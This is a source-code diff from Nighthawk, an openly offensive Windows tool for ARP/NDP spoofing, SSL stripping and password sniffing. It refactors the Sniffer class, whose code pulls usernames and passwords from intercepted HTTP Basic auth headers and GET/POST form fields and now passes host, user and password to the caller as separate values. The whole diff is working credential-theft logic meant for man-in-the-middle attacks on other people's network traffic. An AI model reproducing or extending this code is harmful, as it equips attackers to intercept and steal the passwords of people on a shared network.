@@ -8,7 +8,7 @@ using PacketDotNet;
 using System.Threading;
 
 /**
-Nighthawk - ARP spoofing, simple SSL stripping and password sniffing for Windows
+Nighthawk - ARP/NDP spoofing, simple SSL stripping and password sniffing for Windows
 Copyright (C) 2010  Klemen Bratec
 
 This program is free software: you can redistribute it and/or modify
@@ -50,16 +50,12 @@ namespace Nighthawk
         private Thread worker;
 
         // events
-        public event SnifferResultHandler OnSnifferResult;
+        public event SnifferResultHandler SnifferResult;
 
-        private void Result(string data, SnifferResult type)
+        private void Result(string url, string username, string password, string aditional, SnifferResultType type)
         {
-            if (data != string.Empty)
-            {
-                // invoke event
-                if (OnSnifferResult != null) OnSnifferResult(data, type);
-
-            }
+            // invoke event
+            if (SnifferResult != null) SnifferResult(url, username, password, aditional, type);
         }
 
         // field names - username
@@ -87,18 +83,18 @@ namespace Nighthawk
         };
 
         // constructor
-        public Sniffer(LivePcapDevice device)
+        public Sniffer(DeviceInfo deviceInfo)
         {
             // store our network interface
-            this.device = device;
+            device = deviceInfo.Device;
+            this.deviceInfo = deviceInfo;
         }
 
         // start sniffer
-        public void Start(bool excludeLocalIP, DeviceInfo deviceInfo)
+        public void Start(bool excludeLocalIP)
         {
             // set
             this.excludeLocalIP = excludeLocalIP;
-            this.deviceInfo = deviceInfo;
 
             // change status
             Started = true;
@@ -173,8 +169,6 @@ namespace Nighthawk
         // credentials search
         public void SnifferSearch(HttpPacket packet)
         {
-            var data = string.Empty;
-
             var user = string.Empty;
             var password = string.Empty;
 
@@ -193,10 +187,7 @@ namespace Nighthawk
                     // split user:password
                     var userData = credentials.Split(':');
 
-                    data = "URL: " + packet.Header.Host + " | User: »" + userData[0] + "« | Password: »" + userData[1] +
-                            "«";
-
-                    Result(data, SnifferResult.HTTPAuth);
+                    Result(packet.Header.Host, userData[0], userData[1], "", SnifferResultType.HTTPAuth);
                 }
                 catch { }
             }
@@ -220,10 +211,7 @@ namespace Nighthawk
                 // create output
                 if (user != string.Empty && password != string.Empty)
                 {
-                    data = "Host: " + (packet.Header.Host != string.Empty ? packet.Header.Host : "/") + " | User: »" + Uri.UnescapeDataString(user) + "« | Password: »" + Uri.UnescapeDataString(password) +
-                            "« (GET)";
-
-                    Result(data, SnifferResult.HTML);
+                    Result((packet.Header.Host != string.Empty ? packet.Header.Host : "/"), Uri.UnescapeDataString(user), Uri.UnescapeDataString(password), "GET method", SnifferResultType.HTML);
                 }
             }
 
@@ -250,22 +238,19 @@ namespace Nighthawk
                 // create output
                 if (user != string.Empty && password != string.Empty)
                 {
-                    data = "Host: " + (packet.Header.Host != string.Empty ? packet.Header.Host : "/") + " | User: »" + Uri.UnescapeDataString(user) + "« | Password: »" + Uri.UnescapeDataString(password) +
-                            "« (POST)";
-
-                    Result(data, SnifferResult.HTML);
-                }
+                    Result((packet.Header.Host != string.Empty ? packet.Header.Host : "/"), Uri.UnescapeDataString(user), Uri.UnescapeDataString(password), "POST method", SnifferResultType.HTML);
+               }
             }
         }
     }
 
     // sniffer result enum
-    public enum SnifferResult
+    public enum SnifferResultType
     {
         HTTPAuth,
         HTML
     }
 
     // OnSnifferResult event delegate
-    public delegate void SnifferResultHandler(string data, SnifferResult type);
+    public delegate void SnifferResultHandler(string url, string username, string password, string aditional, SnifferResultType type);
 }
